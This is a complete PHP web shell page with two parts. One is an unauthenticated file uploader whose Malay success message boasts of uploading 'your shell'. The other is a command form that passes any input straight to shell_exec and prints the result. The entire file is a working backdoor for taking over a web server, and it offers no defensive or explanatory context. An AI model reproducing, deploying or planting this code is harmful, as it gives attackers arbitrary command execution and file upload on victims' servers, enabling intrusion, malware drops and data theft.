<!DOCTYPE html>
<html>

<head>
    <title>PHP Web Shell</title>
  </head>

<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
else { echo '<b>file uploaded!</b><br><br>'; }
}
?>
  
  <body>
    <h1>PHP Web Shell</h1>
    <form method="POST">
      <label>Enter a command:</label><br>
      <input type="text" name="cmd"><br>
      <input type="submit" value="Execute">
    </form>
    <?php
      if (isset($_POST["cmd"])) {
        $cmd = $_POST["cmd"];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
      }
    ?>
  </body>
</html>



